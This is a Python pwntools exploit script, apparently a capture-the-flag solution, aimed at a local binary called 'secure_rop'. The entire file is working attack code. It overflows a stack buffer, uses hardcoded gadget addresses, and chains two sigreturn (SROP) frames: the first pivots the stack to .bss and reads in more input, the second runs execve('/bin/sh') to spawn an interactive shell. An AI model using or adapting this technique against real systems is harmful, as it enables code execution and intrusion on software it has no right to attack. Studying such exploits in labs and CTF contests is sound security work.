from pwn import*
p = process('./secure_rop')
# gadget
RLR = 0x401021
LR = 0x401035
bss = 0x402000+0x400
pop_rax = 0x401032
syscall = 0x401033

frame = SigreturnFrame(arch="amd64")

# exploit
pay = ''
pay += 'a'*0x80
pay += 'b'*0x8
pay += p64(pop_rax)
pay += p64(15)

frame.rax = 0
frame.rsp = bss+0x8
frame.rbp = bss+0x60
frame.rdi = 0
frame.rsi = bss
frame.rdx = 0x400
frame.rip = syscall

pay += str(frame)
p.send(pay)

frame = SigreturnFrame(arch="amd64")
pay = ''
pay += '/bin/sh\x00'
pay += 'a'*0x60
pay += p64(pop_rax)
pay += p64(15)

frame.rax = 59
frame.rdi = bss
frame.rsi = 0
frame.rdx = 0
frame.rip = syscall

pay += str(frame)
p.sendline(pay)

p.interactive()
